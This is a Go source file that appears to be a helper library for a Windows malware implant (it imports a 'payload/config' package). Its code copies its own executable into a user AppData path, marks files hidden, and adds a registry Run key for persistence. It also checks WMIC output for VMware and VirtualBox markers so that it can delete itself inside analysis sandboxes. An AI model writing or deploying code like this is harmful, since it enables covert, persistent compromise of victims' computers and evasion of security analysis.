package lib

import (
	"bufio"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	conf "payload/config"
	"strconv"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

type FileInf struct {
	FileName string
	FileData string
	NNAME    string
}

func Argument(command, cut string, args int) string {
	recv := strings.Split(command, cut)
	for len(recv) == args {
		time.Sleep(3 * time.Second)
		continue
	}
	return recv[args]
}

func HiddenAttribute(path string) {
	utf16file, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		log.Panic(err)
	}
	if conf.HIDE_FILE {
		if err = syscall.SetFileAttributes(utf16file, syscall.FILE_ATTRIBUTE_HIDDEN); err != nil {
			log.Panic(err)
		}
	}
}

func httpReq(method, url string) *http.Response {
	client := &http.Client{}
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		log.Panic(err)
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Panic(err)
	}
	return resp
}

func registryKey(regisPath string) registry.Key {
	key, err := registry.OpenKey(registry.CURRENT_USER, regisPath, registry.SET_VALUE)
	if err != nil {
		log.Panic(err)
	}
	return key
}

func (f *FileInf) Startup() {
	os.Rename(os.Args[0], conf.PAYLOAD_PATH+f.NNAME)
	HiddenAttribute(conf.PAYLOAD_PATH + f.NNAME)
	if err := registryKey(conf.HKEY_STARTUP).SetStringValue(f.FileName, conf.PAYLOAD_PATH+f.NNAME); err != nil {
		log.Panic(err)
	}
}

func (f *FileInf) createFile() (*os.File, error) {
	cfile, err := os.Create(f.FileName)
	if err != nil {
		log.Panic(err)
	}
	return cfile, err
}

func (f *FileInf) OverSizeData() string {
	if len(f.FileData) > 500 {
		cfile, err := f.createFile()
		if err != nil {
			log.Panic(err)
		}
		writer := bufio.NewWriter(cfile)
		if _, err = writer.WriteString(f.FileData); err != nil {
			log.Panic(err)
		}
		writer.Flush()

		HiddenAttribute(f.CurrentPath() + "\\" + f.FileName)

		return "Creating file for oversize characters...\n\n" +
			"File Name: " + f.FileName + "\n" +
			"File Path: " + f.CurrentPath() + "\\" + f.FileName +
			"\nHidden Attribute: " + strconv.FormatBool(conf.HIDE_FILE)
	}
	return f.FileData
}

func (f *FileInf) CurrentPath() string {
	path, err := os.Getwd()
	if err != nil {
		log.Panic(err)
	}
	return path
}

func CurrentUser() string {
	user, err := user.Current()
	if err != nil {
		log.Panic(err)
	}
	return "C:\\Users\\" + Argument(user.Username, "\\", 1) + "\\AppData\\"
}

func (f *FileInf) RuntimeVM() {
	getWMIC := func(method, info string) string {
		wmic := exec.Command("wmic", method, "get", info)
		wmicOut, err := wmic.CombinedOutput()
		if err != nil {
			log.Panic(err)
		}
		return string(wmicOut)
	}

	/*
		VMware
	*/
	manufacturerVMW := strings.Contains(getWMIC("computersystem", "manufacturer"), "VMware, Inc.")
	modelVMW := strings.Contains(getWMIC("computersystem", "model"), "VMware")
	biosVMW := strings.Contains(getWMIC("bios", "smbiosbiosversion"), "VMW")

	/*
		VirtualBox
	*/
	manufacturerVB := strings.Contains(getWMIC("computersystem", "manufacturer"), "innotek GmbH")
	modelVB := strings.Contains(getWMIC("computersystem", "model"), "VirtualBox")
	biosVB := strings.Contains(getWMIC("bios", "smbiosbiosversion"), "VirtualBox")

	if manufacturerVMW || modelVMW || biosVMW || manufacturerVB || modelVB || biosVB {
		f.SelfRemove()
	}
}
